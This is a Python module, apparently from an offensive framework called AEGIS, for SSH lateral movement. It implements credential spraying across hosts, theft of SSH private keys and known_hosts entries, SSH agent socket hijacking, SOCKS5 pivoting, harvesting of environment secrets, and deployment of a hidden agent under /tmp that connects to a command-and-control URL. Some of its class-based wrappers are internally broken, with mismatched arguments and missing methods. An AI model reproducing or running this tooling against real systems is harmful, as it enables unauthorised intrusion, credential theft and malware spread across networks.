import logging
log = logging.getLogger(__name__)
#!/usr/bin/env python3
"""
AEGIS-Advanced SSH Lateral Movement Module
============================================
SSH connect, execute, SFTP upload/download,
credential spray, key harvesting, tunnel/port-forward,
known_hosts pivoting, agent socket hijacking.
"""
import os
import socket
import threading
import time
import re
import subprocess
from io import StringIO
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


# ══════════════════════════════════════════════
# Connection
# ══════════════════════════════════════════════

class SSHSession:
    """
    Wrapper around paramiko SSHClient with retry, keepalive,
    and convenience methods for SFTP, exec, tunnel.
    """

    def __init__(self, host: str, username: str,
                 password: str = None, key: str = None,
                 key_path: str = None, port: int = 22,
                 timeout: int = 10, banner_timeout: int = 10,
                 compress: bool = True):
        self.host     = host
        self.port     = port
        self.username = username
        self._client  = None
        self._sftp    = None
        self._lock    = threading.Lock()

        if not HAS_PARAMIKO:
            raise RuntimeError("paramiko is required for SSH operations")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        connect_kwargs = dict(
            hostname        = host,
            port            = port,
            username        = username,
            timeout         = timeout,
            banner_timeout  = banner_timeout,
            compress        = compress,
            look_for_keys   = False,
            allow_agent     = False,
        )

        if key:
            # PEM string provided directly
            pkey = paramiko.RSAKey.from_private_key(StringIO(key))
            connect_kwargs["pkey"] = pkey
        elif key_path:
            for cls in [paramiko.RSAKey, paramiko.Ed25519Key,
                        paramiko.ECDSAKey, paramiko.DSSKey]:
                try:
                    pkey = cls.from_private_key_file(key_path)
                    connect_kwargs["pkey"] = pkey
                    break
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)
        elif password:
            connect_kwargs["password"] = password

        client.connect(**connect_kwargs)
        # Enable keepalive
        transport = client.get_transport()
        transport.set_keepalive(30)
        self._client = client

    def exec(self, command: str, timeout: int = 60,
              sudo: bool = False, sudo_pass: str = None) -> Tuple[str, str, int]:
        """Execute command. Returns (stdout, stderr, exit_code)."""
        if sudo:
            command = "sudo -S {}".format(command)
        chan = self._client.get_transport().open_session()
        chan.settimeout(timeout)
        if sudo and sudo_pass:
            chan.get_pty()
        chan.exec_command(command)
        if sudo and sudo_pass:
            chan.sendall((sudo_pass + "\n").encode())
        stdout = chan.makefile("r").read()
        stderr = chan.makefile_stderr("r").read()
        exit_code = chan.recv_exit_status()
        return stdout.strip(), stderr.strip(), exit_code

    def exec_interactive(self, commands: List[str],
                          delay: float = 0.3) -> str:
        """Run multiple commands in an interactive shell."""
        chan = self._client.invoke_shell()
        chan.settimeout(5)
        output = ""
        for cmd in commands:
            chan.sendall((cmd + "\n").encode())
            time.sleep(delay)
            try:
                buf = b""
                while chan.recv_ready():
                    buf += chan.recv(4096)
                output += buf.decode(errors="replace")
            except Exception as _exc:
                log.debug("exec_interactive: %s", _exc)
        chan.close()
        return output

    def upload(self, local_path: str, remote_path: str) -> bool:
        """Upload file via SFTP."""
        try:
            sftp = self._client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            return True
        except Exception as e:
            print("[ssh] upload failed:", e)
            return False

    def upload_bytes(self, data: bytes, remote_path: str,
                      mode: int = 0o644) -> bool:
        """Upload bytes directly to remote path."""
        try:
            import io
            sftp = self._client.open_sftp()
            with sftp.open(remote_path, "wb") as f:
                f.write(data)
            sftp.chmod(remote_path, mode)
            sftp.close()
            return True
        except Exception as e:
            print("[ssh] upload_bytes failed:", e)
            return False

    def download(self, remote_path: str,
                  local_path: str) -> bool:
        """Download file via SFTP."""
        try:
            sftp = self._client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            return True
        except Exception as e:
            print("[ssh] download failed:", e)
            return False

    def download_bytes(self, remote_path: str) -> Optional[bytes]:
        """Download file contents as bytes."""
        try:
            sftp = self._client.open_sftp()
            with sftp.open(remote_path, "rb") as f:
                data = f.read()
            sftp.close()
            return data
        except Exception:
            return None

    def list_dir(self, path: str = ".") -> List[Dict]:
        """List remote directory."""
        try:
            sftp = self._client.open_sftp()
            attrs = sftp.listdir_attr(path)
            sftp.close()
            return [{"name": a.filename, "size": a.st_size or 0,
                     "mode": a.st_mode or 0} for a in attrs]
        except Exception:
            return []

    def forward_local_port(self, local_port: int, remote_host: str,
                            remote_port: int) -> threading.Thread:
        """
        Local port forward: localhost:local_port -> remote_host:remote_port
        Returns the listener thread (daemon).
        """
        transport = self._client.get_transport()

        def handler(local_sock):
            try:
                chan = transport.open_channel(
                    "direct-tcpip",
                    (remote_host, remote_port),
                    local_sock.getpeername())
                if chan is None: local_sock.close(); return
                while True:
                    import select as _sel
                    r, _, _ = _sel.select([local_sock, chan], [], [], 1)
                    if local_sock in r:
                        d = local_sock.recv(4096)
                        if not d: break
                        chan.send(d)
                    if chan in r:
                        d = chan.recv(4096)
                        if not d: break
                        local_sock.send(d)
            except Exception as _exc:
                log.debug("handler: %s", _exc)
            finally:
                try: local_sock.close()
                except Exception as _e: log.debug("suppressed exception: %s", _e)

        def listener():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("127.0.0.1", local_port))
            srv.listen(5)
            while True:
                try:
                    s, _ = srv.accept()
                    threading.Thread(target=handler, args=(s,),
                                      daemon=True).start()
                except Exception:
                    break

        t = threading.Thread(target=listener, daemon=True)
        t.start()
        return t

    def socks5_proxy(self, local_port: int = 1080) -> threading.Thread:
        """
        Start a SOCKS5 proxy tunnelled over this SSH connection.
        Uses dynamic port forwarding (-D equivalent).
        """
        transport = self._client.get_transport()

        def _socks5_handler(sock):
            try:
                # Negotiate SOCKS5
                sock.recv(2)           # version + nmethods
                sock.send(b"\x05\x00") # no auth
                hdr  = sock.recv(4)
                if len(hdr) < 4 or hdr[0] != 5 or hdr[1] != 1:
                    sock.close(); return
                atyp = hdr[3]
                if atyp == 1:    # IPv4
                    host = socket.inet_ntoa(sock.recv(4))
                elif atyp == 3:  # domain
                    n    = ord(sock.recv(1))
                    host = sock.recv(n).decode()
                elif atyp == 4:  # IPv6
                    host = socket.inet_ntop(socket.AF_INET6, sock.recv(16))
                else:
                    sock.close(); return
                port = int.from_bytes(sock.recv(2), "big")
                try:
                    chan = transport.open_channel(
                        "direct-tcpip", (host, port), ("127.0.0.1", 0))
                    sock.send(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                    import select as _sel
                    while True:
                        r, _, _ = _sel.select([sock, chan], [], [], 1)
                        if sock in r:
                            d = sock.recv(4096)
                            if not d: break
                            chan.send(d)
                        if chan in r:
                            d = chan.recv(4096)
                            if not d: break
                            sock.send(d)
                except Exception:
                    sock.send(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            except Exception as _exc:
                log.debug("unknown: %s", _exc)
            finally:
                try: sock.close()
                except Exception as _e: log.debug("suppressed exception: %s", _e)

        def srv_loop():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("127.0.0.1", local_port))
            srv.listen(20)
            print("[ssh] SOCKS5 proxy on 127.0.0.1:{}".format(local_port))
            while True:
                try:
                    s, _ = srv.accept()
                    threading.Thread(target=_socks5_handler, args=(s,),
                                      daemon=True).start()
                except Exception:
                    break

        t = threading.Thread(target=srv_loop, daemon=True)
        t.start()
        return t

    def get_system_info(self) -> Dict:
        """Gather target system information."""
        info = {}
        commands = {
            "id":       "id",
            "hostname": "hostname",
            "uname":    "uname -a",
            "os":       "cat /etc/os-release 2>/dev/null | head -5",
            "ip":       "ip addr 2>/dev/null || ifconfig 2>/dev/null | head -20",
            "users":    "cat /etc/passwd | grep -v nologin | grep -v false | grep sh",
            "sudo":     "sudo -n -l 2>&1 | head -20",
            "processes":"ps aux --no-headers 2>/dev/null | head -20",
            "network":  "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -20",
            "mounts":   "mount | grep -v proc | grep -v sys | grep -v dev",
            "crontab":  "crontab -l 2>/dev/null",
            "env":      "env 2>/dev/null | grep -i -E 'pass|key|secret|token|api'",
        }
        for key, cmd in commands.items():
            stdout, _, rc = self.exec(cmd)
            if rc == 0 and stdout:
                info[key] = stdout[:1000]
        return info

    def close(self):
        if self._sftp:
            try: self._sftp.close()
            except Exception as _e: log.debug("suppressed exception: %s", _e)
        if self._client:
            try: self._client.close()
            except Exception as _e: log.debug("suppressed exception: %s", _e)

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()


# ══════════════════════════════════════════════
# Quick connect helper
# ══════════════════════════════════════════════

def connect(host: str, username: str, password: str = None,
            key: str = None, key_path: str = None,
            port: int = 22) -> Optional[SSHSession]:
    """Connect to SSH host. Returns SSHSession or None."""
    try:
        return SSHSession(host, username, password=password,
                          key=key, key_path=key_path, port=port)
    except Exception as e:
        print("[ssh] connect {}@{}:{} failed: {}".format(username, host, port, e))
        return None


# ══════════════════════════════════════════════
# Credential spraying
# ══════════════════════════════════════════════

def spray(hosts: List[str], usernames: List[str],
          passwords: List[str] = None,
          key_paths: List[str] = None,
          port: int = 22,
          delay: float = 0.5,
          max_per_host: int = 3,
          callback=None) -> List[Dict]:
    """
    Credential spray across multiple hosts.
    Returns list of valid credentials found.
    Respects lockout: max_per_host attempts per host.
    """
    if not passwords: passwords = []
    if not key_paths: key_paths = []

    hits = []
    for host in hosts:
        host_hits = 0
        for user in usernames:
            if host_hits >= max_per_host:
                break
            # Try passwordless (blank password)
            session = connect(host, user, password="", port=port)
            if session:
                hit = {"host": host, "user": user, "auth": "blank_password", "port": port}
                hits.append(hit)
                host_hits += 1
                if callback: callback(hit, session)
                session.close()
                continue
            # Try passwords
            for pwd in passwords:
                session = connect(host, user, password=pwd, port=port)
                if session:
                    hit = {"host": host, "user": user, "auth": "password",
                           "password": pwd, "port": port}
                    hits.append(hit)
                    host_hits += 1
                    if callback: callback(hit, session)
                    session.close()
                    break
                time.sleep(delay)
            # Try keys
            for kp in key_paths:
                session = connect(host, user, key_path=kp, port=port)
                if session:
                    hit = {"host": host, "user": user, "auth": "key",
                           "key_path": kp, "port": port}
                    hits.append(hit)
                    host_hits += 1
                    if callback: callback(hit, session)
                    session.close()
                    break
    return hits


# ══════════════════════════════════════════════
# SSH key harvesting
# ══════════════════════════════════════════════

def harvest_ssh_keys(session: SSHSession) -> List[Dict]:
    """
    Collect SSH private keys from the remote host.
    Searches ~/.ssh/, /etc/ssh/, common locations.
    """
    keys = []
    search_paths = [
        "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa",
        "~/.ssh/id_dsa", "/root/.ssh/id_rsa", "/root/.ssh/id_ed25519",
        "/etc/ssh/ssh_host_rsa_key", "/etc/ssh/ssh_host_ed25519_key",
    ]
    # Also find all key files dynamically
    stdout, _, _ = session.exec(
        "find / -maxdepth 5 -name 'id_*' -not -name '*.pub' "
        "-readable 2>/dev/null | head -20")
    for line in stdout.splitlines():
        if line.strip() not in search_paths:
            search_paths.append(line.strip())

    for path in search_paths:
        exp_path = path.replace("~", "")  # SFTP doesn't expand ~
        data = session.download_bytes(path)
        if data and b"PRIVATE KEY" in data:
            keys.append({
                "path":    path,
                "content": data.decode(errors="replace"),
                "size":    len(data),
            })
    return keys


def harvest_known_hosts(session: SSHSession) -> List[str]:
    """Extract hostnames/IPs from known_hosts files."""
    hosts = set()
    paths = ["~/.ssh/known_hosts", "/root/.ssh/known_hosts",
             "/etc/ssh/ssh_known_hosts"]
    for path in paths:
        data = session.download_bytes(path)
        if data:
            for line in data.decode(errors="replace").splitlines():
                if line.startswith("#") or not line.strip(): continue
                # known_hosts format: hostname,ip keytype key
                host_part = line.split()[0] if line.split() else ""
                for h in host_part.split(","):
                    # Strip hashed entries
                    if h.startswith("|"): continue
                    hosts.add(h.strip())
    return list(hosts)


# ══════════════════════════════════════════════
# Agent socket hijacking
# ══════════════════════════════════════════════

def list_agent_sockets() -> List[str]:
    """Find SSH agent sockets accessible to current user."""
    sockets = []
    try:
        out = subprocess.run(
            "find /tmp /run -name 'agent.*' -type s 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            if os.access(line.strip(), os.R_OK | os.W_OK):
                sockets.append(line.strip())
    except Exception as _exc:
        log.debug("list_agent_sockets: %s", _exc)
    return sockets


def hijack_agent(socket_path: str, host: str, username: str,
                  port: int = 22) -> Optional[SSHSession]:
    """
    Connect to SSH host using a hijacked agent socket.
    Sets SSH_AUTH_SOCK and attempts connection.
    """
    os.environ["SSH_AUTH_SOCK"] = socket_path
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Use agent for auth
        agent = paramiko.Agent()
        agent_keys = agent.get_keys()
        if not agent_keys:
            return None
        for key in agent_keys:
            try:
                client.connect(host, port=port, username=username,
                                 pkey=key, timeout=10,
                                 allow_agent=True, look_for_keys=False)
                session = SSHSession.__new__(SSHSession)
                session.host     = host
                session.port     = port
                session.username = username
                session._client  = client
                session._sftp    = None
                session._lock    = threading.Lock()
                return session
            except Exception as _exc:
                log.debug("unknown: %s", _exc)
    except Exception as e:
        print("[ssh] agent hijack failed:", e)
    return None


# ══════════════════════════════════════════════
# Network discovery from SSH pivot
# ══════════════════════════════════════════════

def discover_network(session: SSHSession) -> Dict:
    """
    Use the SSH pivot to discover internal network hosts.
    """
    results = {"arp": [], "routes": [], "interfaces": [], "alive_hosts": []}

    # ARP table
    stdout, _, _ = session.exec("arp -a 2>/dev/null || ip neigh 2>/dev/null")
    for line in stdout.splitlines():
        m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
        if m: results["arp"].append(m.group(1))

    # Routes
    stdout, _, _ = session.exec("ip route 2>/dev/null || route -n 2>/dev/null")
    results["routes"] = stdout.splitlines()[:20]

    # Interfaces
    stdout, _, _ = session.exec(
        "ip addr 2>/dev/null | grep 'inet ' || ifconfig 2>/dev/null")
    for line in stdout.splitlines():
        m = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/(\d+)", line)
        if m: results["interfaces"].append(
            {"ip": m.group(1), "prefix": m.group(2)})

    return results


# ══════════════════════════════════════════════
# Lateral pivot: deploy & run aegis_core on target
# ══════════════════════════════════════════════

def deploy_agent(session: SSHSession,
                  agent_bytes: bytes,
                  c2_url: str,
                  node_id: str = None) -> bool:
    """
    Upload node agent to target and execute it.
    Returns True if successfully launched.
    """
    remote_path = "/tmp/.sysd_{}".format(os.urandom(4).hex())
    ok = session.upload_bytes(agent_bytes, remote_path, mode=0o755)
    if not ok: return False
    # Execute detached
    cmd = "nohup python3 {} --c2 {} --node-id {} &>/dev/null & echo $!".format(
        remote_path, c2_url, node_id or "auto")
    stdout, _, rc = session.exec(cmd)
    if rc == 0 and stdout.strip().isdigit():
        print("[ssh] Agent deployed PID {} on {}".format(stdout.strip(), session.host))
        return True
    return False


if __name__ == "__main__":
    print("[ssh] Module loaded. HAS_PARAMIKO:", HAS_PARAMIKO)
    print("[ssh] Agent sockets:", list_agent_sockets())


# ════════════════════════════════════════════════════════════════════════════
# Class-based API and compatibility aliases matching __init__.py exports
# ════════════════════════════════════════════════════════════════════════════

class SSHCredSpray:
    """
    Multi-host SSH credential spraying with lockout awareness.
    Wraps the module-level spray() function in a stateful class.
    """
    def __init__(self, delay: float = 2.0, jitter: float = 0.5,
                  max_failures: int = 3):
        self.delay       = delay
        self.jitter      = jitter
        self.max_failures = max_failures
        self.results: List[Dict] = []

    def run(self, hosts: List[str], usernames: List[str],
             passwords: List[str] = None, key_paths: List[str] = None,
             port: int = 22) -> List[Dict]:
        """Spray credentials across hosts. Returns list of successful sessions."""
        self.results = spray(
            hosts=hosts,
            usernames=usernames,
            passwords=passwords or [],
            key_paths=key_paths or [],
            port=port,
        )
        return self.results

    def successful_sessions(self) -> List[SSHSession]:
        """Return connected SSHSession objects for each successful host."""
        sessions = []
        for r in self.results:
            if r.get("success"):
                sess = SSHSession(r["host"], r.get("port", 22),
                                   username=r.get("username"),
                                   password=r.get("password"),
                                   key_path=r.get("key_path"))
                if sess.connect():
                    sessions.append(sess)
        return sessions


class SSHKeyHarvest:
    """Harvest SSH keys from a compromised host via an existing session."""
    def __init__(self, session: SSHSession):
        self.session = session

    def harvest_keys(self) -> List[Dict]:
        """Harvest SSH private/public keys from the remote host."""
        return harvest_ssh_keys(self.session)

    def harvest_known_hosts(self) -> List[str]:
        """Harvest ~/.ssh/known_hosts from the remote host."""
        return harvest_known_hosts(self.session)


class SSHPivot:
    """Network discovery and lateral hop management via an SSH session."""
    def __init__(self, session: SSHSession):
        self.session = session
        self._discovered: Dict = {}

    def discover_network(self) -> Dict:
        """Run passive network discovery from the remote host."""
        self._discovered = discover_network(self.session)
        return self._discovered

    def socks5_proxy(self, local_port: int = 1080) -> bool:
        """Start a SOCKS5 proxy through the session."""
        try:
            self.session.socks5_proxy(local_port=local_port)
            return True
        except Exception:
            return False


class SSHMover:
    """
    High-level orchestrator: spray → harvest → pivot → deploy.
    Combines SSHCredSpray, SSHKeyHarvest, SSHPivot, and deploy_agent.
    """
    def __init__(self, c2_url: str = "", agent_path: str = ""):
        self.c2_url     = c2_url
        self.agent_path = agent_path

    def spray_and_move(self, hosts: List[str],
                        credentials: List[tuple],
                        deploy_agent_flag: bool = False) -> Dict:
        """
        Spray all hosts with credentials.
        Optionally deploy the agent to each successful host.
        """
        usernames = list({c[0] for c in credentials})
        passwords = list({c[1] for c in credentials if len(c) > 1})

        sprayer = SSHCredSpray()
        results = sprayer.run(hosts, usernames, passwords)

        sessions = sprayer.successful_sessions()
        deployed  = []

        for sess in sessions:
            if deploy_agent_flag and self.agent_path:
                try:
                    ok = deploy_agent(sess, self.agent_path,
                                       c2_url=self.c2_url)
                    deployed.append({"host": sess.host, "deployed": ok})
                except Exception as e:
                    deployed.append({"host": sess.host, "deployed": False,
                                      "error": str(e)})
            sess.close()

        return {"successful": len(sessions), "deployed": deployed}


# find_agent_sockets is the public alias for list_agent_sockets
find_agent_sockets = list_agent_sockets
